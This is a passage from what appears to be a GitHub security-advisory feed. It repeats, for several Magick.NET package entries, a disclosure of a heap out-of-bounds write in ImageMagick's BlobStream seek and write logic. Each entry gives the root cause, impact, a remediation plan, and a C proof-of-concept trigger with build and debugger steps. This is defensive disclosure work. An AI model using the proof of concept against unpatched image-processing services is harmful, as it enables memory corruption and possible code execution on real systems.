<h2 id="expected-at-second-stoptype--blobstream-·-offset-≈-0x10000000-256-mib-·-length-≈-34-·-extent-≈-64-kib-≪-offset--length-·-quantum-≈-128-kib-·-mapped--magickfalse-·-data--offset-far-beyond-base-next-continue-crashes-in-_platform_memmove"><strong>Expected at second stop:</strong><br><code>type = BlobStream</code>&nbsp;·&nbsp;<code>offset ≈ 0x10000000</code>&nbsp;(256 MiB) ·&nbsp;<code>length ≈ 3–4</code>&nbsp;·&nbsp;<code>extent ≈ 64 KiB</code>&nbsp;(≪&nbsp;<code>offset + length</code>) ·&nbsp;<code>quantum ≈ 128 KiB</code>&nbsp;·&nbsp;<code>mapped = MagickFalse</code>&nbsp;·&nbsp;<code>data + offset</code>&nbsp;far beyond base; next&nbsp;<code>continue</code>&nbsp;crashes in&nbsp;<code>_platform_memmove</code>.
    </h2>
<h2 id="credits">Credits</h2>
<p><strong>Reported by:</strong>&nbsp;Lumina Mescuwa</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e">https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57807">https://nvd.nist.gov/vuln/detail/CVE-2025-57807</a></li>
<li><a href="https://github.com/advisories/GHSA-23hg-53q6-hqfg">https://github.com/advisories/GHSA-23hg-53q6-hqfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-23hg-53q6-hqfg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-09-05T20:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-x64] ImageMagick BlobStream Forward-Seek Under-Allocation]]></title>
        <id>https://github.com/advisories/GHSA-23hg-53q6-hqfg</id>
        <link href="https://github.com/advisories/GHSA-23hg-53q6-hqfg"/>
        <updated>2025-09-10T20:49:21.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Reporter:</strong>&nbsp;Lumina Mescuwa<br><strong>Product:</strong>&nbsp;ImageMagick 7 (MagickCore)<br><strong>Component:</strong>&nbsp;<code>MagickCore/blob.c</code>&nbsp;(Blob I/O - BlobStream)<br><strong>Tested:</strong>&nbsp;7.1.2-0 (source tag) and 7.1.2-1 (Homebrew), macOS arm64, clang-17, Q16-HDRI<br><strong>Impact:</strong>&nbsp;Heap out-of-bounds&nbsp;<strong>WRITE</strong>&nbsp;(attacker-controlled bytes at attacker-chosen offset) → memory corruption; potential code execution  </p>
<hr>
<h2 id="executive-summary">Executive Summary</h2>
<p>For memory-backed blobs (<strong>BlobStream</strong>),&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;permits advancing the stream&nbsp;<strong>offset</strong>&nbsp;beyond the current end without increasing capacity. The subsequent&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;then expands by&nbsp;<strong><code>quantum + length</code></strong>&nbsp;(amortized) instead of&nbsp;<strong><code>offset + length</code></strong>, and copies to&nbsp;<code>data + offset</code>. When&nbsp;<code>offset ≫ extent</code>, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required.</p>
<hr>
<h2 id="affected-scope">Affected Scope</h2>
<ul>
<li><p><strong>Versions confirmed:</strong>&nbsp;7.1.2-0, 7.1.2-1</p>
</li>
<li><p><strong>Architectures:</strong>&nbsp;Observed on macOS arm64; architecture-agnostic on LP64</p>
</li>
<li><p>Paths: MagickCore blob subsystem —&nbsp;<strong>BlobStream</strong>&nbsp;(<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;and&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>).</p>
</li>
<li><p><strong>Not required:</strong>&nbsp;External delegates; special policies; integer wraparound</p>
</li>
</ul>
<hr>
<h2 id="technical-root-cause">Technical Root Cause</h2>
<p><strong>Types (LP64):</strong><br><code>offset: MagickOffsetType</code>&nbsp;(signed 64-bit)<br><code>extent/length/quantum: size_t</code>&nbsp;(unsigned 64-bit)<br><code>data: unsigned char*</code></p>
<p><strong>Contract mismatch:</strong></p>
<ul>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;(BlobStream) updates&nbsp;<code>offset</code>&nbsp;to arbitrary positions, including past end,&nbsp;<strong>without</strong>&nbsp;capacity adjustment.</p>
</li>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;tests&nbsp;<code>offset + length &gt;= extent</code>&nbsp;and grows&nbsp;<strong>by</strong>&nbsp;<code>length + quantum</code>, doubles&nbsp;<code>quantum</code>, reallocates to&nbsp;<code>extent + 1</code>, then:</p>
<pre><code>q = data + (size_t)offset;
memmove(q, src, length);
</code></pre>
<p>  There is&nbsp;<strong>no guarantee</strong>&nbsp;that&nbsp;<code>extent ≥ offset + length</code>&nbsp;post-growth. With&nbsp;<code>offset ≫ extent</code>,&nbsp;<code>q</code>&nbsp;is beyond the allocation.</p>
</li>
</ul>
<p><strong>Wrap-free demonstration:</strong><br>Initialize&nbsp;<code>extent=1</code>, write one byte (<code>offset=1</code>), seek to&nbsp;<code>0x10000000</code>&nbsp;(256 MiB), then write 3–4 bytes. Growth remains &lt;&lt;&nbsp;<code>offset + length</code>; the copy overruns the heap buffer.</p>
<hr>
<h2 id="exploitability--reachability">Exploitability &amp; Reachability</h2>
<ul>
<li><p><strong>Primitive:</strong>&nbsp;Controlled bytes written at a controlled displacement from the buffer base.</p>
</li>
<li><p><strong>Reachability:</strong>&nbsp;Any encode-to-memory flow that forward-seeks prior to writing (e.g., header back-patching, reserved-space strategies). Even if current encoders/writers avoid this, the API contract&nbsp;<strong>permits</strong>&nbsp;it, thus creating a latent sink for first- or third-party encoders/writers.</p>
</li>
<li><p><strong>Determinism:</strong>&nbsp;Once a forward seek past end occurs, the first subsequent write reliably corrupts memory.</p>
</li>
</ul>
<hr>
<h2 id="impact-assessment">Impact Assessment</h2>
<ul>
<li><p><strong>Integrity:</strong>&nbsp;High - adjacent object/metadata overwrite plausible.</p>
</li>
<li><p><strong>Availability:</strong>&nbsp;High - reliably crashable (ASan and non-ASan).</p>
</li>
<li><p><strong>Confidentiality:</strong>&nbsp;High - Successful exploitation to RCE allows the attacker to read all data accessible by the compromised process.</p>
</li>
<li><p><strong>RCE plausibility:</strong>&nbsp;Typical of heap OOB writes in long-lived image services; allocator/layout dependent.</p>
</li>
</ul>
<hr>
<h2 id="cvss-v31-rationale-98">CVSS v3.1 Rationale (9.8)</h2>
<ul>
<li><p><strong>AV:N / PR:N / UI:N</strong>&nbsp;- server-side image processing is commonly network-reachable without auth or user action.</p>
</li>
<li><p><strong>AC:L</strong>&nbsp;- a single forward seek + write suffices; no races or specialized state.</p>
</li>
<li><p><strong>S:U</strong>&nbsp;- corruption localized to the ImageMagick process.</p>
</li>
<li><p><strong>C:H / I:H / A:H</strong>&nbsp;- A successful exploit leads to RCE, granting full control over the process. This results in a total loss of Confidentiality (reading sensitive data), Integrity (modifying files/data), and Availability (terminating the service).</p>
</li>
</ul>
<p><em>Base scoring assumes successful exploitation; environmental mitigations are out of scope of Base metrics.</em></p>
<hr>
<h2 id="violated-invariant">Violated Invariant</h2>
<blockquote>
<p><strong>Before copying&nbsp;<code>length</code>&nbsp;bytes at&nbsp;<code>offset</code>, enforce&nbsp;<code>extent ≥ offset + length</code>&nbsp;with overflow-checked arithmetic.</strong></p>
</blockquote>
<p>The BlobStream growth policy preserves amortized efficiency but fails to enforce this&nbsp;<strong>per-write</strong>&nbsp;safety invariant.</p>
<hr>
<h2 id="remediation-principle">Remediation (Principle)</h2>
<p>In&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;(BlobStream case):</p>
<ol>
<li><p><strong>Checked requirement:</strong><br> <code>need = (size_t)offset + length;</code>&nbsp;→ if&nbsp;<code>need &lt; (size_t)offset</code>, overflow → fail.</p>
</li>
<li><p><strong>Ensure capacity ≥ need:</strong><br> <code>target = MagickMax(extent + quantum + length, need);</code><br> (Optionally loop, doubling&nbsp;<code>quantum</code>, until&nbsp;<code>extent ≥ need</code>&nbsp;to preserve amortization.)</p>
</li>
<li><p><strong>Reallocate to&nbsp;<code>target + 1</code>&nbsp;before copying;</strong>&nbsp;then perform the move.</p>
</li>
</ol>
<p><strong>Companion hardening (recommended):</strong></p>
<ul>
<li><p>Document or restrict&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;on BlobStream so forward seeks either trigger explicit growth/zero-fill or require the subsequent write to meet the invariant.</p>
</li>
<li><p>Centralize blob arithmetic in checked helpers.</p>
</li>
<li><p>Unit tests: forward-seek-then-write (success and overflow-reject).</p>
</li>
</ul>
<hr>
<h2 id="regression--compatibility">Regression &amp; Compatibility</h2>
<ul>
<li><p><strong>Behavior change:</strong>&nbsp;Forward-seeked writes will either allocate to required size or fail cleanly (overflow/alloc-fail).</p>
</li>
<li><p><strong>Memory profile:</strong>&nbsp;Single writes after very large seeks may allocate large buffers; callers requiring sparse behavior should use file-backed streams.</p>
</li>
</ul>
<hr>
<h2 id="vendor-verification-checklist">Vendor Verification Checklist</h2>
<ul>
<li><p>Reproduce with a minimal in-memory BlobStream harness under ASan.</p>
</li>
<li><p>Apply fix; verify&nbsp;<code>extent ≥ offset + length</code>&nbsp;at all write sites.</p>
</li>
<li><p>Add forward-seek test cases (positive/negative).</p>
</li>
<li><p>Audit other growth sites (<code>SetBlobExtent</code>, stream helpers).</p>
</li>
<li><p>Clarify BlobStream seek semantics in documentation.</p>
</li>
<li><p>Unit test: forward seek to large offset on&nbsp;<strong>BlobStream</strong>&nbsp;followed by 1–8 byte writes; assert either growth to&nbsp;<code>need</code>&nbsp;or clean failure.</p>
</li>
</ul>
<hr>
<h1 id="poc--reproduction--notes">PoC / Reproduction / Notes</h1>
<h2 id="environment">Environment</h2>
<ul>
<li><p><strong>OS/Arch:</strong>&nbsp;macOS 14 (arm64)</p>
</li>
<li><p><strong>Compiler:</strong>&nbsp;clang-17 with AddressSanitizer</p>
</li>
<li><p><strong>ImageMagick:</strong>&nbsp;Q16-HDRI</p>
</li>
<li><p><strong>Prefix:</strong>&nbsp;<code>~/opt/im-7.1.2-0</code></p>
</li>
<li><p><strong><code>pkg-config</code>:</strong>&nbsp;from PATH (no hard-coded&nbsp;<code>/usr/local/...</code>)</p>
</li>
</ul>
<hr>
<h2 id="build-imagemagick-712-0-static-minimal">Build ImageMagick 7.1.2-0 (static, minimal)</h2>
<pre><code class="language-bash">./configure --prefix="$HOME/opt/im-7.1.2-0" --enable-hdri --with-quantum-depth=16 \
  --disable-shared --enable-static --without-modules \
  --without-magick-plus-plus --disable-openmp --without-perl \
  --without-x --without-lqr --without-gslib

make -j"$(sysctl -n hw.ncpu)"
make install

"$HOME/opt/im-7.1.2-0/bin/magick" -version &gt; magick_version.txt
</code></pre>
<hr>
<h2 id="build--run-the-poc-memory-backed-blobstream">Build &amp; Run the PoC (memory-backed BlobStream)</h2>
<p><strong><code>poc.c</code>:</strong><br><em>Uses private headers (<code>blob-private.h</code>) to exercise blob internals; a public-API variant (custom streams) is feasible but unnecessary for triage.</em></p>
<pre><code class="language-c">// poc.c

#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;MagickCore/MagickCore.h&gt;

#include &lt;MagickCore/blob.h&gt;

#include "MagickCore/blob-private.h"

  

int main(int argc, char **argv) {

MagickCoreGenesis(argv[0], MagickTrue);

ExceptionInfo *e = AcquireExceptionInfo();

ImageInfo *ii = AcquireImageInfo();

Image *im = AcquireImage(ii, e);

if (!im) return 1;

  

// 1-byte memory blob → BlobStream

unsigned char *buf = (unsigned char*) malloc(1);

buf[0] = 0x41;

AttachBlob(im-&gt;blob, buf, 1); // type=BlobStream, extent=1, offset=0

SetBlobExempt(im, MagickTrue); // don't free our malloc'd buf

  

// Step 1: write 1 byte (creates BlobInfo + sets offset=1)

unsigned char A = 0x42;

(void) WriteBlob(im, 1, &amp;A);

fprintf(stderr, "[+] after 1 byte: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 2: seek way past end without growing capacity

const MagickOffsetType big = (MagickOffsetType) 0x10000000; // 256 MiB

(void) SeekBlob(im, big, SEEK_SET);

fprintf(stderr, "[+] after seek: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 3: small write → reallocation grows by quantum+length, not to offset+length

// memcpy then writes to data + offset (OOB)

const unsigned char payload[] = "PWN";

(void) WriteBlob(im, sizeof(payload), payload);

  

// If we get here, it didn't crash

fprintf(stderr, "[-] no crash; check ASan flags.\n");

  

(void) CloseBlob(im);

DestroyImage(im); DestroyImageInfo(ii); DestroyExceptionInfo(e);

MagickCoreTerminus();

return 0;

}
</code></pre>
<hr>
<p><code>run:</code></p>
<pre><code class="language-bash"># Use the private prefix for pkg-config
export PKG_CONFIG_PATH="$HOME/opt/im-7.1.2-0/lib/pkgconfig:$PKG_CONFIG_PATH"

# Strict ASan for crisp failure
export ASAN_OPTIONS='halt_on_error=1:abort_on_error=1:detect_leaks=0:fast_unwind_on_malloc=0'

# Compile (static link pulls transitive deps via --static)
clang -std=c11 -g -O1 -fno-omit-frame-pointer -fsanitize=address -o poc poc.c \
  $(pkg-config --cflags MagickCore-7.Q16HDRI) \
  $(pkg-config --static --libs MagickCore-7.Q16HDRI)

# Execute and capture
./poc 2&gt;&amp;1 | tee asan.log
</code></pre>
<p><strong>Expected markers prior to the fault:</strong></p>
<pre><code>[+] after 1 byte: off=1 len=1
[+] after seek:  off=268435456 len=1
</code></pre>
<p>An ASan&nbsp;<strong>WRITE</strong>&nbsp;crash in&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob</code></a>&nbsp;follows (top frames:&nbsp;<code>WriteBlob blob.c:&lt;line&gt;</code>, then&nbsp;<code>_platform_memmove</code>&nbsp;/&nbsp;<code>__sanitizer_internal_memmove</code>).</p>
<hr>
<h2 id="debugger-verification-manual">Debugger Verification (manual)</h2>
<p>LLDB can be used to snapshot the invariants; ASan alone is sufficient.</p>
<pre><code>lldb ./poc
(lldb) settings set use-color false
(lldb) break set -n WriteBlob
(lldb) run

# First stop (prime write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) continue

# Second stop (post-seek write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) expr -- (unsigned long long)image-&gt;blob-&gt;offset + (unsigned long long)length
(lldb) expr -- (void*)((unsigned char*)image-&gt;blob-&gt;data + (size_t)image-&gt;blob-&gt;offset)

# Into the fault; if inside memmove (no locals):
(lldb) bt
(lldb) frame select 1
(lldb) frame var image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum
</code></pre>
<h2 id="expected-at-second-stoptype--blobstream-·-offset-≈-0x10000000-256-mib-·-length-≈-34-·-extent-≈-64-kib-≪-offset--length-·-quantum-≈-128-kib-·-mapped--magickfalse-·-data--offset-far-beyond-base-next-continue-crashes-in-_platform_memmove"><strong>Expected at second stop:</strong><br><code>type = BlobStream</code>&nbsp;·&nbsp;<code>offset ≈ 0x10000000</code>&nbsp;(256 MiB) ·&nbsp;<code>length ≈ 3–4</code>&nbsp;·&nbsp;<code>extent ≈ 64 KiB</code>&nbsp;(≪&nbsp;<code>offset + length</code>) ·&nbsp;<code>quantum ≈ 128 KiB</code>&nbsp;·&nbsp;<code>mapped = MagickFalse</code>&nbsp;·&nbsp;<code>data + offset</code>&nbsp;far beyond base; next&nbsp;<code>continue</code>&nbsp;crashes in&nbsp;<code>_platform_memmove</code>.
    </h2>
<h2 id="credits">Credits</h2>
<p><strong>Reported by:</strong>&nbsp;Lumina Mescuwa</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e">https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57807">https://nvd.nist.gov/vuln/detail/CVE-2025-57807</a></li>
<li><a href="https://github.com/advisories/GHSA-23hg-53q6-hqfg">https://github.com/advisories/GHSA-23hg-53q6-hqfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-23hg-53q6-hqfg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-09-05T20:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-x64] ImageMagick BlobStream Forward-Seek Under-Allocation]]></title>
        <id>https://github.com/advisories/GHSA-23hg-53q6-hqfg</id>
        <link href="https://github.com/advisories/GHSA-23hg-53q6-hqfg"/>
        <updated>2025-09-10T20:49:21.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Reporter:</strong>&nbsp;Lumina Mescuwa<br><strong>Product:</strong>&nbsp;ImageMagick 7 (MagickCore)<br><strong>Component:</strong>&nbsp;<code>MagickCore/blob.c</code>&nbsp;(Blob I/O - BlobStream)<br><strong>Tested:</strong>&nbsp;7.1.2-0 (source tag) and 7.1.2-1 (Homebrew), macOS arm64, clang-17, Q16-HDRI<br><strong>Impact:</strong>&nbsp;Heap out-of-bounds&nbsp;<strong>WRITE</strong>&nbsp;(attacker-controlled bytes at attacker-chosen offset) → memory corruption; potential code execution  </p>
<hr>
<h2 id="executive-summary">Executive Summary</h2>
<p>For memory-backed blobs (<strong>BlobStream</strong>),&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;permits advancing the stream&nbsp;<strong>offset</strong>&nbsp;beyond the current end without increasing capacity. The subsequent&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;then expands by&nbsp;<strong><code>quantum + length</code></strong>&nbsp;(amortized) instead of&nbsp;<strong><code>offset + length</code></strong>, and copies to&nbsp;<code>data + offset</code>. When&nbsp;<code>offset ≫ extent</code>, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required.</p>
<hr>
<h2 id="affected-scope">Affected Scope</h2>
<ul>
<li><p><strong>Versions confirmed:</strong>&nbsp;7.1.2-0, 7.1.2-1</p>
</li>
<li><p><strong>Architectures:</strong>&nbsp;Observed on macOS arm64; architecture-agnostic on LP64</p>
</li>
<li><p>Paths: MagickCore blob subsystem —&nbsp;<strong>BlobStream</strong>&nbsp;(<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;and&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>).</p>
</li>
<li><p><strong>Not required:</strong>&nbsp;External delegates; special policies; integer wraparound</p>
</li>
</ul>
<hr>
<h2 id="technical-root-cause">Technical Root Cause</h2>
<p><strong>Types (LP64):</strong><br><code>offset: MagickOffsetType</code>&nbsp;(signed 64-bit)<br><code>extent/length/quantum: size_t</code>&nbsp;(unsigned 64-bit)<br><code>data: unsigned char*</code></p>
<p><strong>Contract mismatch:</strong></p>
<ul>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;(BlobStream) updates&nbsp;<code>offset</code>&nbsp;to arbitrary positions, including past end,&nbsp;<strong>without</strong>&nbsp;capacity adjustment.</p>
</li>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;tests&nbsp;<code>offset + length &gt;= extent</code>&nbsp;and grows&nbsp;<strong>by</strong>&nbsp;<code>length + quantum</code>, doubles&nbsp;<code>quantum</code>, reallocates to&nbsp;<code>extent + 1</code>, then:</p>
<pre><code>q = data + (size_t)offset;
memmove(q, src, length);
</code></pre>
<p>  There is&nbsp;<strong>no guarantee</strong>&nbsp;that&nbsp;<code>extent ≥ offset + length</code>&nbsp;post-growth. With&nbsp;<code>offset ≫ extent</code>,&nbsp;<code>q</code>&nbsp;is beyond the allocation.</p>
</li>
</ul>
<p><strong>Wrap-free demonstration:</strong><br>Initialize&nbsp;<code>extent=1</code>, write one byte (<code>offset=1</code>), seek to&nbsp;<code>0x10000000</code>&nbsp;(256 MiB), then write 3–4 bytes. Growth remains &lt;&lt;&nbsp;<code>offset + length</code>; the copy overruns the heap buffer.</p>
<hr>
<h2 id="exploitability--reachability">Exploitability &amp; Reachability</h2>
<ul>
<li><p><strong>Primitive:</strong>&nbsp;Controlled bytes written at a controlled displacement from the buffer base.</p>
</li>
<li><p><strong>Reachability:</strong>&nbsp;Any encode-to-memory flow that forward-seeks prior to writing (e.g., header back-patching, reserved-space strategies). Even if current encoders/writers avoid this, the API contract&nbsp;<strong>permits</strong>&nbsp;it, thus creating a latent sink for first- or third-party encoders/writers.</p>
</li>
<li><p><strong>Determinism:</strong>&nbsp;Once a forward seek past end occurs, the first subsequent write reliably corrupts memory.</p>
</li>
</ul>
<hr>
<h2 id="impact-assessment">Impact Assessment</h2>
<ul>
<li><p><strong>Integrity:</strong>&nbsp;High - adjacent object/metadata overwrite plausible.</p>
</li>
<li><p><strong>Availability:</strong>&nbsp;High - reliably crashable (ASan and non-ASan).</p>
</li>
<li><p><strong>Confidentiality:</strong>&nbsp;High - Successful exploitation to RCE allows the attacker to read all data accessible by the compromised process.</p>
</li>
<li><p><strong>RCE plausibility:</strong>&nbsp;Typical of heap OOB writes in long-lived image services; allocator/layout dependent.</p>
</li>
</ul>
<hr>
<h2 id="cvss-v31-rationale-98">CVSS v3.1 Rationale (9.8)</h2>
<ul>
<li><p><strong>AV:N / PR:N / UI:N</strong>&nbsp;- server-side image processing is commonly network-reachable without auth or user action.</p>
</li>
<li><p><strong>AC:L</strong>&nbsp;- a single forward seek + write suffices; no races or specialized state.</p>
</li>
<li><p><strong>S:U</strong>&nbsp;- corruption localized to the ImageMagick process.</p>
</li>
<li><p><strong>C:H / I:H / A:H</strong>&nbsp;- A successful exploit leads to RCE, granting full control over the process. This results in a total loss of Confidentiality (reading sensitive data), Integrity (modifying files/data), and Availability (terminating the service).</p>
</li>
</ul>
<p><em>Base scoring assumes successful exploitation; environmental mitigations are out of scope of Base metrics.</em></p>
<hr>
<h2 id="violated-invariant">Violated Invariant</h2>
<blockquote>
<p><strong>Before copying&nbsp;<code>length</code>&nbsp;bytes at&nbsp;<code>offset</code>, enforce&nbsp;<code>extent ≥ offset + length</code>&nbsp;with overflow-checked arithmetic.</strong></p>
</blockquote>
<p>The BlobStream growth policy preserves amortized efficiency but fails to enforce this&nbsp;<strong>per-write</strong>&nbsp;safety invariant.</p>
<hr>
<h2 id="remediation-principle">Remediation (Principle)</h2>
<p>In&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;(BlobStream case):</p>
<ol>
<li><p><strong>Checked requirement:</strong><br> <code>need = (size_t)offset + length;</code>&nbsp;→ if&nbsp;<code>need &lt; (size_t)offset</code>, overflow → fail.</p>
</li>
<li><p><strong>Ensure capacity ≥ need:</strong><br> <code>target = MagickMax(extent + quantum + length, need);</code><br> (Optionally loop, doubling&nbsp;<code>quantum</code>, until&nbsp;<code>extent ≥ need</code>&nbsp;to preserve amortization.)</p>
</li>
<li><p><strong>Reallocate to&nbsp;<code>target + 1</code>&nbsp;before copying;</strong>&nbsp;then perform the move.</p>
</li>
</ol>
<p><strong>Companion hardening (recommended):</strong></p>
<ul>
<li><p>Document or restrict&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;on BlobStream so forward seeks either trigger explicit growth/zero-fill or require the subsequent write to meet the invariant.</p>
</li>
<li><p>Centralize blob arithmetic in checked helpers.</p>
</li>
<li><p>Unit tests: forward-seek-then-write (success and overflow-reject).</p>
</li>
</ul>
<hr>
<h2 id="regression--compatibility">Regression &amp; Compatibility</h2>
<ul>
<li><p><strong>Behavior change:</strong>&nbsp;Forward-seeked writes will either allocate to required size or fail cleanly (overflow/alloc-fail).</p>
</li>
<li><p><strong>Memory profile:</strong>&nbsp;Single writes after very large seeks may allocate large buffers; callers requiring sparse behavior should use file-backed streams.</p>
</li>
</ul>
<hr>
<h2 id="vendor-verification-checklist">Vendor Verification Checklist</h2>
<ul>
<li><p>Reproduce with a minimal in-memory BlobStream harness under ASan.</p>
</li>
<li><p>Apply fix; verify&nbsp;<code>extent ≥ offset + length</code>&nbsp;at all write sites.</p>
</li>
<li><p>Add forward-seek test cases (positive/negative).</p>
</li>
<li><p>Audit other growth sites (<code>SetBlobExtent</code>, stream helpers).</p>
</li>
<li><p>Clarify BlobStream seek semantics in documentation.</p>
</li>
<li><p>Unit test: forward seek to large offset on&nbsp;<strong>BlobStream</strong>&nbsp;followed by 1–8 byte writes; assert either growth to&nbsp;<code>need</code>&nbsp;or clean failure.</p>
</li>
</ul>
<hr>
<h1 id="poc--reproduction--notes">PoC / Reproduction / Notes</h1>
<h2 id="environment">Environment</h2>
<ul>
<li><p><strong>OS/Arch:</strong>&nbsp;macOS 14 (arm64)</p>
</li>
<li><p><strong>Compiler:</strong>&nbsp;clang-17 with AddressSanitizer</p>
</li>
<li><p><strong>ImageMagick:</strong>&nbsp;Q16-HDRI</p>
</li>
<li><p><strong>Prefix:</strong>&nbsp;<code>~/opt/im-7.1.2-0</code></p>
</li>
<li><p><strong><code>pkg-config</code>:</strong>&nbsp;from PATH (no hard-coded&nbsp;<code>/usr/local/...</code>)</p>
</li>
</ul>
<hr>
<h2 id="build-imagemagick-712-0-static-minimal">Build ImageMagick 7.1.2-0 (static, minimal)</h2>
<pre><code class="language-bash">./configure --prefix="$HOME/opt/im-7.1.2-0" --enable-hdri --with-quantum-depth=16 \
  --disable-shared --enable-static --without-modules \
  --without-magick-plus-plus --disable-openmp --without-perl \
  --without-x --without-lqr --without-gslib

make -j"$(sysctl -n hw.ncpu)"
make install

"$HOME/opt/im-7.1.2-0/bin/magick" -version &gt; magick_version.txt
</code></pre>
<hr>
<h2 id="build--run-the-poc-memory-backed-blobstream">Build &amp; Run the PoC (memory-backed BlobStream)</h2>
<p><strong><code>poc.c</code>:</strong><br><em>Uses private headers (<code>blob-private.h</code>) to exercise blob internals; a public-API variant (custom streams) is feasible but unnecessary for triage.</em></p>
<pre><code class="language-c">// poc.c

#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;MagickCore/MagickCore.h&gt;

#include &lt;MagickCore/blob.h&gt;

#include "MagickCore/blob-private.h"

  

int main(int argc, char **argv) {

MagickCoreGenesis(argv[0], MagickTrue);

ExceptionInfo *e = AcquireExceptionInfo();

ImageInfo *ii = AcquireImageInfo();

Image *im = AcquireImage(ii, e);

if (!im) return 1;

  

// 1-byte memory blob → BlobStream

unsigned char *buf = (unsigned char*) malloc(1);

buf[0] = 0x41;

